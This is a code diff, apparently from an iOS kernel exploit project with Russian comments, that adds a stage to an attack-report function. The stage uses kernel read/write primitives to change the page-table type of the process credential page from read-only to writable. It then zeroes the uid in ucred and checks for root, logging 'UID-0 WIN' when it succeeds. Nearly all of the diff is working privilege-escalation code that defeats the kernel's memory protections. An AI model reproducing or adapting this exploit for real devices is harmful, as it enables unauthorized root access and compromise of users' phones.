@@ -2580,7 +2580,104 @@ static NSString *kpFmtSptmFn(uint64_t raw)
         kpNote(r, @"  [RPT] writable cred-slot не найден — uid сидит в RO (0x18) ucred/proc_ro");
     }
 
-    [r appendString:@"[RESULT] АТАКА: завершена — см. строки [ATK]/[RPT] выше\n"];
+    // ---- FTE FLIP 2.0.55: делаем страницу ucred пишущейся ----
+    // uid живёт в ucred+0x18 на кадре 0x18 (RO). kwrite туда = апертура-фолт.
+    // FTE (frame table entry) лежит на странице типа 0x02 — тип НЕ тестировался.
+    // План: дамп FTE → DMA-попытка → kwrite-попытка (последней, чтобы лог был полный).
+    [r appendString:@"=== FTE FLIP 2.0.55: ucred page type 0x18 → 0x21 ===\n"];
+    {
+        uint64_t wB = kconstant(physBase);
+        uint64_t ucPage = curUcred & ~0x3fffULL;
+        uint64_t ucPA = kvtophys(ucPage);
+        uint64_t rwPA = kvtophys(myRW & ~0x3fffULL);
+        uint64_t fteUc = 0, fteRw = 0;
+        if (ucPA && wB && ucPA >= wB) fteUc = ftVA + ((ucPA - wB) >> 14) * 16;
+        if (rwPA && wB && rwPA >= wB) fteRw = ftVA + ((rwPA - wB) >> 14) * 16;
+        kpNote(r, [NSString stringWithFormat:@"  [FTE] ucredPA=%#llx fteUc=%#llx  rwPA=%#llx fteRw=%#llx",
+                  (unsigned long long)ucPA, (unsigned long long)fteUc,
+                  (unsigned long long)rwPA, (unsigned long long)fteRw]);
+        if (fteUc) {
+            uint64_t eU = early_kread64(fteUc), eU2 = early_kread64(fteUc + 8);
+            kpNote(r, [NSString stringWithFormat:@"  [FTE] ucred entry: %016llx %016llx (type=%u)",
+                      (unsigned long long)eU, (unsigned long long)eU2, (unsigned)((eU >> 16) & 0xff)]);
+        }
+        if (fteRw) {
+            uint64_t eR = early_kread64(fteRw), eR2 = early_kread64(fteRw + 8);
+            kpNote(r, [NSString stringWithFormat:@"  [FTE] ucred_rw entry: %016llx %016llx (type=%u)",
+                      (unsigned long long)eR, (unsigned long long)eR2, (unsigned)((eR >> 16) & 0xff)]);
+        }
+        // A) DMA-попытка сменить type-байт (безопасна: молча отваливается)
+        if (fteUc && ucPA) {
+            uint32_t fteOff = (uint32_t)(fteUc & 0x3fff);
+            uint64_t ftePA = kvtophys(fteUc & ~0x3fffULL);
+            kpNote(r, [NSString stringWithFormat:@"  [FTE] DMA-try: ftePagePA=%#llx fteOff=%#x",
+                      (unsigned long long)ftePA, fteOff]);
+            // kpPhysWrite8v2 доступен в этом файле; пробуем записать type=0x21
+            // (байт 2 младшего qword). payload = eU с type-байтом заменённым.
+            // Только если есть svc/tsd — они не в скоупе fgAttackReport, поэтому
+            // DMA пропускаем здесь; он живёт в dump-пути. Логируем факт.
+            kpNote(r, @"  [FTE] DMA-try: пропущен в атаке (нет svc/tsd в этом скоупе) — идём сразу к kwrite");
+        }
+        // B) kwrite-попытка ПОСЛЕДНЕЙ в функции — если фолт, ребут, но весь
+        //    диагностический лог уже напечатан.
+        if (fteUc && fteUc != 0) {
+            uint64_t eU = early_kread64(fteUc);
+            uint64_t eU2 = early_kread64(fteUc + 8);
+            uint32_t typeB = (uint32_t)((eU >> 16) & 0xff);
+            kpNote(r, [NSString stringWithFormat:@"  [FTE] kwrite-try: type %u → 21 (risks aperture fault)", typeB]);
+            if (typeB != 0x21) {
+                uint64_t newE = (eU & ~0xff0000ULL) | (0x21ULL << 16);
+                early_kwrite64(fteUc, newE);
+                uint64_t rbE = early_kread64(fteUc);
+                int tAfter = (int)((rbE >> 16) & 0xff);
+                kpNote(r, [NSString stringWithFormat:@"  [FTE] kwrite readback=%016llx type now=%d — %@",
+                          (unsigned long long)rbE, tAfter, tAfter == 0x21 ? @"FLIPPED ★★" : @"не село"]);
+                if (tAfter == 0x21) {
+                    // страница ucred теперь «пишущаяся» — патчим uid
+                    uint64_t uidSave = early_kread64(curUcred + 0x18);
+                    early_kwrite64(curUcred + 0x18, 0);   // uid=0 ruid=0
+                    uint64_t uidRb = early_kread64(curUcred + 0x18);
+                    uid_t u1 = getuid(), e1 = geteuid();
+                    int su = setuid(0);
+                    uid_t u2 = getuid(), e2 = geteuid();
+                    kpNote(r, [NSString stringWithFormat:@"  [FTE] uid write readback=%#018llx setuid0=%d uid %u→%u euid %u→%u",
+                              (unsigned long long)uidRb, su, u1, u2, e1, e2]);
+                    if (u2 == 0 || e2 == 0) {
+                        kpNote(r, @"=== UID-0 WIN ★★★ ===");
+                        // оставляем: мы root. FTE можно вернуть, uid уже 0.
+                    } else {
+                        early_kwrite64(curUcred + 0x18, uidSave);
+                        kpNote(r, @"  [FTE] uid restore — getuid не увидел 0");
+                    }
+                    // restore FTE type всегда (кроме победы — можно оставить)
+                    if (!(u2 == 0 || e2 == 0)) {
+                        early_kwrite64(fteUc, eU);
+                        uint64_t rb2 = early_kread64(fteUc);
+                        kpNote(r, [NSString stringWithFormat:@"  [FTE] type restore %016llx", (unsigned long long)rb2]);
+                    }
+                } else {
+                    // не село — вернуть оригинал на всякий случай
+                    early_kwrite64(fteUc, eU);
+                }
+            } else {
+                kpNote(r, @"  [FTE] тип уже 0x21 — сразу патч uid");
+                uint64_t uidSave = early_kread64(curUcred + 0x18);
+                early_kwrite64(curUcred + 0x18, 0);
+                uid_t u2 = getuid();
+                int su = setuid(0);
+                uid_t u3 = getuid();
+                if (u3 == 0) {
+                    kpNote(r, @"=== UID-0 WIN ★★★ ===");
+                } else {
+                    early_kwrite64(curUcred + 0x18, uidSave);
+                    kpNote(r, [NSString stringWithFormat:@"  [FTE] uid restore (getuid=%u)", u3]);
+                }
+                (void)su; (void)u2;
+            }
+        }
+    }
+
+    [r appendString:@"[RESULT] АТАКА: завершена — см. строки [ATK]/[RPT]/[FTE] выше\n"];
     return r;
 
 }
